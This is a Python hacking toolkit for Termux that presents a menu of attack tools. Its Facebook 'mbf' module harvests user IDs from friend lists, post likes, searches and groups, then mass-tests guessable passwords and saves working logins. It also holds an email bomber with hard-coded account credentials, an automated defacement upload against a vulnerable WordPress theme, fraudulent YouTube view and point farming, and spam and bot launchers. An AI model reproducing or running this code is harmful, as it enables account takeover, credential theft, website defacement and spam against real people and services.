#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os,sys,time,requests,json,re,random,yagmail
from prompt_toolkit import prompt
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
from time import sleep
def clear():
    os.system('clear')
def balik():
    f=input('\033[00m\t\r[Enter To Back]')
    if f == '':
        os.system('python tools.py')
    else:
        sys.exit()
def kata(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
def view():
    clear()
    baner()
    mail=input('\033[00mEmail: \033[96m')
    f=input("""
\033[1;96m1). \033[1;97mEarn Point
\033[1;96m2). \033[1;97mBuy Views
\033[1;96m0). \033[1;97mBack
\033[0m>> \033[1;96m""")
    if f == "1":
       try:
            ua={
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "video.sub4subnow.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.11.0"}
            dat={
            "checksum":"943e7b4ad1515616f5392af47c459199",
            "millis":"1595652080233",
            "thumbUrl":"",
            "userName":"",
            "version":"61",
            "email":mail}
            r=requests.post("https://video.sub4subnow.com/users.logInvaaa3", data=dat, headers=ua).text
            js=json.loads(r)
            su=js["accessToken"]
            si=js["userInfor"]["userId"]
            xi=js["userInfor"]["userName"]
            se=js["userInfor"]["point"]
            print ("\033[1;97mYourPoint:\033[1;96m",se)
            while True:
                  ji={
                  "maxResult":"1",
                  "lastCampaignId":"393646",
                  "orderBy":"0",
                  "accessToken":su,
                  "type":"0",
                  "userId":si,
                  "version":"61",
                  "countryId":"0"}
                  d=requests.post("https://video.sub4subnow.com/campaign.getAllViewCampaigns", data=ji, headers=ua).text
                  hh=json.loads(d)
                  for x in hh["campaigns"]:
                      ne=x['campaignId']
                      be=x['thumbUrl']
                  w={
                  "campaignId":ne,
                  "accessToken":su,
                  "thumbUrl":be,
                  "userName":xi,
                  "userId":si,
                  "version":"61"
                  }
                  for i in range(1,4):
                       s=requests.post("https://video.sub4subnow.com/campaign.updateCampaignProgress", data=w, headers=ua).text
                  c={
                  "userId":si,
                  "millis":"1595652080233",
                  "version":"61",
                  "accessToken":su,
                  "userName":xi,
                  "thumbUrl":be,
                  "campaignId":ne,
                  "checksum":"943e7b4ad1515616f5392af47c459199"
                  }
                  g=requests.post("https://video.sub4subnow.com/campaign.subOrView", data=c, headers=ua).text
                  jj=json.loads(g)
                  if jj["success"]==True:
                     print ("\033[1;97mReward: \033[1;96m",jj["point"])
                  else:
                     print ("\033[1;97mReward: \033[1;91mFailed!\033[00m")
       except NameError:
            print ("Wrong!!")
            view()
       except KeyError:
            view()
       except KeyboardInterrupt:
            print ("exit")
       except requests.exceptions.ConnectionError:
            sys.exit("Connection error")

    elif f == "2":
         hd={
         "Content-Type": "application/x-www-form-urlencoded",
         "Host": "video.sub4subnow.com",
         "Connection": "Keep-Alive",
         "Accept-Encoding": "gzip",
         "User-Agent": "okhttp/3.11.0"
         }
         dat={
         "checksum":"943e7b4ad1515616f5392af47c459199",
         "millis":"1595652080233",
         "thumbUrl":"",
         "userName":"",
         "version":"61",
         "email":mail}
         r=requests.post("https://video.sub4subnow.com/users.logInvaaa3", data=dat, headers=hd).text
         js=json.loads(r)
         su=js["accessToken"]
         hi=js["userInfor"]["userId"]
         xi=js["userInfor"]["userName"]
         he=js["userInfor"]["point"]
         print ("\033[1;97mYourPoint:\033[1;96m",he)
         print ("""
 \n\033[1;97m10  views = 100 Point  | 50   views = 500 Point
100 views = 1000 Point | 300  views = 3000 Point
500 views = 5000 Point | 1000 views = 10000 Point
\033[1;94m________________________________________________""")
         ur=input('\033[00mVidio Id: \033[1;96m')
         ua={
         "Accept-Encoding": "gzip",
         "User-Agent": "Google-API-Java-Client Google-HTTP-Java-Client/1.22.0 (gzip)",
         "x-android-package": "subexchange.hdcstudio.dev.subexchange",
         "x-android-cert": "7FAB56149399CE1B3D56AD22C9B847BC0B0B596A",
         "Host": "www.googleapis.com",
         "Connection": "Keep-Alive",
         }
         r=requests.get(f"https://www.googleapis.com/youtube/v3/videos?id={ur}&key=AIzaSyAlwz_Vj6mWIBgqgKD0rQwI82Fa4S3cskk&part=id,%20snippet", headers=ua).text
         h=json.loads(r)
         w=h["items"]
         for x in w:
             tb=x["snippet"]["thumbnails"]["default"]["url"]
             tit=x["snippet"]["title"]
             id=x["id"]
         mb=requests.get(tb, headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 10; SM-A107F Build/QP1A.190711.020)","Host": "i.ytimg.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"})
         tl=input("\033[1;97mViews Count: \033[1;96m")
         dt={
         "videoId":ur,
         "accessToken":su,
         "type":"0",
         "userName":xi,
         "userId":hi,
         "version":"61",
         "countryId":"0",
         "total":tl,
         "videoName":tit,
         "checksum":"05d9da390e6eb65fb64a580a2a27a95e",
         "videoTime":"60",
         "millis":"1597342739366",
         "thumbUrl":tb
         }
         kata("\033[1;97mTitle: \033[1;96m"+str(tit))
         kata("\033[1;97mViews: \033[1;96m"+str(tl))
         load()
         br=requests.post("https://video.sub4subnow.com/campaign.createNewvaaa3", data=dt, headers=hd).text
         c=json.loads(br)
         tod=c["campaignId"]
         if c['success'] == True:
            print ("\r\n\033[1;94m________________________________________________\n\033[1;97mResponse: \033[1;92mSuccess\n\033[1;97mCampaignId:\033[1;96m",tod,"\n\033[1;97mRemaining Point:\033[1;96m",c["point"])
            view()
         else:
            print ("\033[1;97mResponse: \033[1;91mFailed!!\033[00m")
            view()
    elif f == '0':
         main()
    else:
         print ("\033[1;91mWrong Input!\033[00m")
         time.sleep(2)
         view()
def baner():
    kata('''\033[94m    
╦╔═\033[00m╔╗╔╔═╗  \033[94m╔╦╗\033[00m╔═╗\033[00m╔═╗╦  ╔═╗
\033[94m╠╩╗\033[00m║║║╠╣  \033[94m  ║\033[00m ║ ║║ ║║  ╚═╗
\033[94m╩ \033[00m╩╝╚╝╚    \033[94m ╩ \033[00m╚═╝╚═╝╩═╝╚═╝''')
    print('\033[41m        Fahmi Apz         \033[00m\n')

def load():
    for x in range(1,101):
        time.sleep(1./20)
        print(f"\r\033[00mLoading...\033[91m{x}\033[00m%", end="", flush=True)
def tom():
    clear()
    baner()
    try:
         os.mkdir('/data/data/com.termux/files/home/.termux')
    except:
         pass
    key = "extra-keys = [['ESC','/','-','HOME','UP','END','PGUP'],['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','PGDN']]"
    knf = open('/data/data/com.termux/files/home/.termux/termux.properties','w')
    knf.write(key)
    knf.close()
    load()
    os.system('termux-reload-settings')
    print ("\033[00mAdd Key \033[92mSuccess\033[00m")
    time.sleep(3)
    main()
def yagmail():
    try:
        import yagmail
        clear()
        baner()
        knf=yagmail.SMTP("comunnityjapan@gmail.com","tes12345")
        mail=input("\033[1;97mEmail Target: \033[1;92m")
        subject=input("\033[1;97mYour Subject: \033[1;92m")
        body=input("\033[1;97mYour Message: \033[1;92m")
        jl=int(input("\033[1;97mLooping: \033[1;92m"))
        for i in range(jl):
            knf.send(mail,subject,body)
            print ('\033[1;97mSend To \033[90m=> \033[1;92m',mail)
        time.sleep(3)
        main()
    except requests.exceptions.ConnectionError:
        sys.exit("\033[1;91mKoneksi Error!!")
def mbf():
    time.sleep(0.1)
    clear()
    baner()
    print("\033[96m1).\033[00m Login")
    print("\033[96m2).\033[00m Logout")
    print("\033[96m0).\033[00m Back")
    time.sleep(0.1)
    f=input("\n\033[00m>> \033[1;96m")
    if f == "1":
         clear()
         baner()
         mbasic = 'https://mbasic.facebook.com{}'
         global die,check,result, count
         id = []
         die = 0
         chek = []
         life = []
         count = 0
         check = 0
         result = 0
         def masuk():
             try:
                    cek = open("cookies").read()
             except FileNotFoundError:
                    cek = input("\033[00mCookies : \033[1;96m")
             cek = {"cookie":cek}
             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
             if "mbasic_logout_button" in str(ismi):
                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
                             with open("cookies","w") as f:
                                     f.write(cek["cookie"])
                     else:
                           print("\033[00mChange the language, please wait\033[1;91m!!\033[00m")
                           try:
                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                           except:
                                  pass
                     try:
                             ikuti = parser(requests.get(mbasic.format("/xzcoder.xzcoder"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                             ses.get(mbasic.format(ikuti),cookies=cek)
                     except :
                             pass
                     return cek["cookie"]
             else:
                  exit("\033[00mCookies \033[1;91minvalid!!\033[00m")
         def login(username,password,cek=False):
             global die,check,result,count
             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
             params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
             }
             api = 'https://b-api.facebook.com/method/auth.login'
             response = requests.get(api, params=params)
             if 'EAA' in response.text:
                 print(f"\r\033[00m[\033[1;32m✓\033[00m] \033[1;32m{username} \033[90m=> \033[1;32m{password}                       ",end="")
                 print()
                 result += 1
                 if cek:
                        life.append(username+"|"+password)
                 else:
                        with open('results-life.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             elif 'www.facebook.com' in response.json()['error_msg']:
                   print(f"\r\033[00m[\033[1;91mx\033[00m] \033[1;33m{username} \033[90m=> \033[1;33m{password}                    ",end="")
                   print()
                   check += 1
                   if cek:
                           chek.append(username+"|"+password)
                   else:
                           with open('results-check.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             else:
                   die += 1
             for i in list('\|/-•'):
                            print(f"\r\033[00m[\033[1;91m{i}\033[00m] Life : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;91m{str(die)}\033[90m)\033[00m",end="")
                            time.sleep(0.2)
         def getid(url):
             raw = requests.get(url,cookies=kuki).content
             getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
             for x in getuser:
                 if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
                 elif 'friends' in x:
                        continue
                 else:
                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
                 print('\r\033[1;96m' + str(len(id)) + " \033[00mretrieved",end="")
             if 'Lihat Teman Lain' in str(raw):
                 getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
             return id
         def fromlikes(url):
             try:
                  like = requests.get(url,cookies=kuki).content
                  love = re.findall('href="(/ufi.*?)"',str(like))[0]
                  aws = getlike(mbasic.format(love))
                  return aws
             except:
                  exit("\033[1;91mcant dump id\033[00m ")
         def getlike(react):
             like = requests.get(react,cookies=kuki).content
             ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
             for user in ids:
                 if 'profile' in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0].split('/')[1])
                 print(f'\r\033[90m \033[1;96m{str(len(id))} \033[00mretrieved',end="")
             if 'Lihat Selengkapnya' in str(like):
                 getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
             return id
         def bysearch(option):
             search = requests.get(option,cookies=kuki).content
             users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
             for user in users:
                  if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                         id.append(user[1] + "|" + user[0].split("?")[0])
                  print(f"\r\033[1;96m{str(len(id))} \033[00mretrieved ",end="")
             if "Lihat Hasil Selanjutnya" in str(search):
                  bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
             return id
         def grubid(endpoint):
             grab = requests.get(endpoint,cookies=kuki).content
             users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
             for user in users:
                 if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0])
                 print(f"\r\033[1;96m{str(len(id))} \033[00mretrieved ",end="")
             if "Lihat Selengkapnya" in str(grab):
                 grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
             return id
         if __name__ == '__main__':
               try:
                   ses = requests.Session()
                   kukis = masuk()
                   kuki = {'cookie':kukis}
                   clear()
                   baner()
                   print('\033[1;96m1). \033[00mCrack Daftar Teman')
                   print('\033[1;96m2). \033[00mCrack Dari Like Post\033[1;97m ')
                   print('\033[1;96m3). \033[00mCrack Dari Pencarian ')
                   print('\033[1;96m4). \033[00mCrack Dari Grup ')
                   print('\033[1;96m5). \033[00mCrack Dari Teman')
                   print('\033[1;96m6). \033[00mLihat Hasil Crack')
                   print('\033[1;96m0). \033[00mBack')
                   print()
                   tanya = input('\033[00m>> \033[1;96m ')
                   if tanya =="":
                         exit("\033[00m[\033[91m!\033[00m] Dont be empty")
                   elif tanya == '1':
                         url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                         username = getid(mbasic.format(url["href"]))
                   elif tanya == '2':
                         username = input("\033[00mURL Post : \033[1;96m")
                         if username == "":
                                 exit("\033[00m[\033[91m!\033[00m] Dont be empty")
                         elif 'www.facebook' in username:
                                 username = username.replace('www.facebook','mbasic.facebook')
                         elif 'm.facebook.com' in username:
                                 username = username.replace('m.facebook.com','mbasic.facebook.com')
                         username = fromlikes(username)
                   elif tanya == '3':
                         knf = input("\033[00mquery : \033[1;96m")
                         username = bysearch(mbasic.format('/search/people/?q='+knf))
                         if len(username) == 0:
                                 exit("\033[90m[\033[91m!\033[00m] no result")
                   elif tanya == '4':
                         print("\033[00mcan only take \033[91m100 \033[00mIDs ")
                         grab = input("\033[00mID group : \033[1;96m")
                         username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                         if len(username) == 0:
                                 exit("\033[00m[\033[91m!\033[00m]ID wrong")
                   elif tanya == '5':
                         knf = input("\033[00mUsername/Id : \033[1;96m")
                         if knf.isdigit():
                                 user = "/profile.php?id=" + knf
                         else:
                                 user = "/" + knf
                         try:
                                 user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
                                 username = getid(mbasic.format(user))
                         except TypeError:
                                 exit("\033[00m[\033[91m!\033[00m] User Not Found ")
                   elif tanya == '6':
                         try:
                                 file1 = open("results-check.txt").read()
                                 file2 = open("results-life.txt").read()
                                 a = file1 + file2
                                 final = a.strip().split("\n")
                                 final = set(final)
                                 print(f"\033[00m [\033[1;93m{str(len(final))}\033[00m] accounts to check ")
                                 with ThreadPoolExecutor(max_workers=10) as ex:
                                         for user in final:
                                                 a = user.split("|")
                                                 ex.submit(login,(a[0]),(a[1]),(True))
                                 os.remove("results-check.txt")
                                 os.remove("results-life.txt")
                                 for x in life:
                                         with open('results-life.txt','a') as f:
                                                 f.write(x+'\n')
                                 for x in chek:
                                         with open('results-check.txt','a') as f:
                                                 f.write(x+"\n")

                                 print("\n\033[00m[\033[92m✓\033[00m] Done")
                                 print("\033[00msaved to \033[1;93mresults-check.txt\033[90m|\033[1;92mresults-life.txt")
                         except FileNotFoundError:
                                 exit("\033[00m[\033[91m!\033[00m] you not have a results")
                   elif tanya == '0':
                        mbf()
                   else:
                         exit("\033[00m[\033[91m!\033[00m] wrong choice")
                   print()
                   expass = input("\033[00mExtra Password: \033[1;96m")
                   with ThreadPoolExecutor(max_workers=30) as ex:
                          for user in username:
                                  users = user.split('|')
                                  ss = users[0].split(' ')
                                  for x in ss:
                                          listpass = [
                                                  str(x) + '123',
                                                  str(x) + '12345',
                                                  str(x) + '123456',
                                                  str(x) + '12',
                                                  ]
                                          listpass.append(expass)
                                          for passw in set(listpass):
                                                  ex.submit(login,(users[1]),(passw))
                   if check != 0 or result != 0:
                           time.sleep(0.1)
                           print("\033[1;94m===========================================\033[00m")
                           print("\n\033[00m[\033[92m✓\033[00m] Done")
                           print("\033[00m[\033[92m✓\033[00m]life : \033[92mresults-life.txt\033[00m")
                           print("\033[00m[\033[91m!\033[00m]checkpoint : \033[93mresults-check.txt\033[00m")
                           print("\n\n")
                   
                   else:
                           time.sleep(0.1)
                           print("\033[94m===========================================\033[00m")
                           print("\n\033[00m[\033[92m✓\033[00m] Done")
                           print("\033[00m[\033[91m!\033[00m] no result")
               except (KeyboardInterrupt,EOFError):
                       exit()
               except requests.exceptions.ConnectionError:
                       exit("\033[00m[\033[91m!\033[00m] Connection error")

    elif f == "2":
         os.system("rm -rf cookies")
         print ("\033[91mLogout\033[00m")
         time.sleep(2)
         mbf()

    elif f == "0":
         main()


    else:
         mbf()

def yt():
    clear()
    baner()
    print ("""
\033[1;96m01).\033[00m Vidio Download
\033[1;96m02).\033[00m Music Download
\033[1;96m00).\033[00m Back""")
    cu = input("\033[1;97m>> \033[1;96m")
    if cu == "01" or cu == "1":
       f = input("\033[1;97mLINK: \033[1;92m")
       tod = ("youtube-dl "+f)
       c = os.system(tod)
       print (c)
       sleep(1)
       print ("\033[1;97m[\033[1;92m✓\033[1;97m]\033[90m-\033[1;97mDownload\033[90m-\033[1;92mSuccess")
    elif cu == "02" or cu == "2":
         ji = input("\033[1;97mLINK: \033[1;92m")
         su = ("youtube-dl -x --audio-format mp3 -o '/sdcard/%(title)s.%(ext)s' "+ji)
         ne = os.system(su)
         print (ne)
         sleep(1)
         print ("\033[1;97m[\033[1;92m✓\033[1;97m]\033[90m-\033[1;97mDownload\033[90m-\033[1;92mSuccess\n\033[1;97m[\033[1;92mthe music is already in the sdcard folder\033[1;97m]")
    elif cu == "00" or cu == "0":
         main()
    else:
         print ("\033[1;91mWrong Input!!")
         yt()
def menu():
    print('''
\033[96m1).\033[00m Go To Menu
\033[96m2).\033[00m Update
\033[96m3).\033[00m Install Bahan
\033[96m0).\033[00m Exit''')
    pil=input('\033[00m>> \033[96m')
    if pil == '1':
        time.sleep(3)
        main()
    elif pil == '2':
        time.sleep(3)
        clear()
        baner()
        os.system('git pull')
        clear()
        baner()
        menu()
    elif pil == '3':
         os.system('sh install.sh')
    elif pil == '0':
        sys.exit('\033[00mThanks For Using This Tools')
    else:
        print('\033[91mWrong Input!\033[00m')
        os.system('python tools.py')
def dfc():
    clear()
    baner()
    ua={
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36"
    }
    aa="/wp-content/themes/sportime-theme/functions/upload-handler.php"
    bb=input("\033[1;97mWeb Target Vuln: \033[1;96m")
    cc=bb+aa
    try:
        dd=input("\033[1;97mScript Deface: \033[1;96m")
        deface=open(dd,"r")
        ee={
            "orange_themes":deface
            }
        gg=requests.post(cc,files=ee,headers=ua)
        print (gg.text)
    except FileNotFoundError:
           print("\033[1;91mScript Tidak ada!!\033[00m")
           dfc()
def main():
    clear()
    baner()
    print('''
\033[96m01). \033[00mPython Yagmail
\033[96m02). \033[00mTermux Key
\033[96m03). \033[00mSpammer
\033[96m04). \033[00mEmpass Facebook Checker
\033[96m05). \033[00mFacebook Mbf
\033[96m06). \033[00mBot Comment Ig
\033[96m07). \033[00mYoutube Downloader
\033[96m08). \033[00mDeface Sportime
\033[96m09). \033[00mViewers Youtube
\033[96m10). \033[00mBot Caping
\033[96m00). \033[00mBack''')
    f=input('\033[00m>> \033[96m')
    if f == '1' or f == '01':
       yagmail()
    elif f == '2' or f == '02':
         tom()
    elif f == '3' or f == '03':
         clear()
         baner()
         os.system('python ~/knf-tool/config/spam.py')
         bl=input("\033[00mCoba Lagi?(y/t): ")
         if bl == "y":
            clear()
            baner()
            os.system('python ~/knf-tool/config/spam.py')
         elif bl == "t":
              main()
         else:
             balik()
    elif f == '4' or f == '04':
         clear()
         baner()
         w=input('\033[00mEmpas File(\033[93mlist.txt\033[00m): \033[93m')
         t= ("php ~/knf-tool/config/fbcheck.php "+w)
         c=os.system(t)
         print(c)
         time.sleep(3)
         main()
    elif f == '5' or f == '05':
         mbf()
    elif f == '6' or f == '06':
         clear()
         baner()
         os.system('python ~/knf-tool/config/ig.py')
         f=input('Coba Lagi?(y/t): ')
         if f == 'y':
            clear()
            baner()
            os.system("python ~/knf-tool/config/ig.py")
         elif f == 't':
              main()
         else:
              balik()
    elif f == '7' or f == '07':
         yt()
    elif f == '8' or f == '08':
         dfc()
    elif f == '9' or f == '09':
         view()
    elif f == '10':
         clear()
         baner()
         os.system('python ~/knf-tool/config/bot.py')
         b=input('coba lagi?(y/t): ')
         if b == 'y':
            clear()
            baner()
            os.system('python ~/knf-tool/config/bot.py')
         elif b == 't':
              main()
         else:
              balik()
    elif f == '00' or f == '0':
         clear()
         baner()
         menu()
    else:
        print('\033[91mWrong Input!\033[00m')
        main()
if __name__=="__main__":
    clear()
    baner()
    menu()
